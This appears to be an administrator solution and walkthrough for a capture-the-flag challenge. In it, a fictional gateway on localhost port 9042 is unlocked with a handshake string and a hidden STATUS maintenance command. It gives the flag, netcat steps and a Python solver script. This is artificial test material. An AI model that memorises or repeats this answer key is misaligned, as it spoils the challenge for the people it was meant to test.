# Level 2: Terminal Protocol & Handshake Guard — Administrator Solution & Exploitation Walkthrough
**Case File: EVIDENCE 05 - THE ATTENTION ECONOMY / THE MONEY TRAIL**
**Threat Actor: $CYBERLEEK**

---

## 1. Challenge Specification
* **Domain**: TCP Socket Protocol Interaction & Handshake Guard Override
* **Difficulty**: Medium
* **Estimated Solve Time**: 10–12 minutes
* **Target Endpoint**: `target.cyberleek.lan:9042` / `127.0.0.1:9042`
* **Target Flag**: `CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}`
* **Reference Documents**:
  - `uploads/terminal_protocol.txt`
  - `uploads/session_telemetry.log`

---

## 2. Vulnerability & Protocol Analysis
Connecting to port 9042 drops the client into a pre-session state with the prompt:
```text
[PRE-SESSION]> 
```
Any command issued without completing the initiation handshake is rejected:
```text
[-] HANDSHAKE FAILED: Gateway bus requires 'INIT_TRANSACTION_SESSION' to establish session.
```

Analyzing the leaked operational log dump `session_telemetry.log` and `terminal_protocol.txt` reveals two critical pieces of intelligence:
1. **Handshake Packet**: Sending `INIT_TRANSACTION_SESSION` authenticates the TCP stream and unlocks the interactive console (`CYBERLEEK-GW> `).
2. **Maintenance Directive**: The logs reveal that the syndicate developers left an internal diagnostic telemetry routine active under the directive `STATUS` (or `AUDIT`).

Issuing `STATUS` triggers the telemetry dump, releases the Level 2 override flag, and automatically transitions to the Operator Gatekeeper Authentication Portal (`AUTH`).

---

## 3. Step-by-Step Exploitation Walkthrough

### Step 1: Connect Over Raw TCP
```bash
nc -nv 127.0.0.1 9042
```

Wait for the pre-session prompt:
```text
[PRE-SESSION]> 
```

### Step 2: Transmit Handshake Packet
Send the session initiation packet:
```text
INIT_TRANSACTION_SESSION
```

Daemon response:
```text
[+] HANDSHAKE ACCEPTED: Interactive transaction gateway console unlocked.

CYBERLEEK-GW> 
```

### Step 3: Issue Maintenance Directive
Dispatch `STATUS`:
```text
STATUS
```

Response:
```text
======================================================================
[+] EXECUTING OPERATIONAL DIAGNOSTIC TELEMETRY...
[+] NODE: GTA-VI-ESCROW-MONETIZATION-RELAY-09
[+] STATUS: OPERATIONAL // ATTENTION ECONOMY ESCROW ACTIVE
[+] THREAT ACTOR: $CYBERLEEK
[+] LEVEL 2 OVERRIDE FLAG: CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}
[+] NOTICE: Operator Authentication Gateway active on transaction bus.
======================================================================
```

### Step 4: Flag Recovery
Milestone Flag: `CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}`.

---

## 4. Standalone Automated Verification Script

Save as `verify_level2.py` and run against the target:

```python
#!/usr/bin/env python3
import socket

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9042
EXPECTED_FLAG = "CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}"

def verify():
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5.0) as s:
        buf = ""
        while "[PRE-SESSION]>" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Transmit handshake packet
        print("[*] Transmitting handshake: 'INIT_TRANSACTION_SESSION'...")
        s.sendall(b"INIT_TRANSACTION_SESSION\n")

        while "CYBERLEEK-GW>" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Dispatch hidden maintenance directive
        print("[*] Sending 'STATUS' maintenance directive...")
        s.sendall(b"STATUS\n")

        resp = ""
        while EXPECTED_FLAG not in resp:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            resp += chunk

        assert EXPECTED_FLAG in resp, f"Expected flag {EXPECTED_FLAG} not found in response."
        print(f"[+] SUCCESS: Extracted Level 2 Flag: {EXPECTED_FLAG}")

if __name__ == "__main__":
    verify()
```
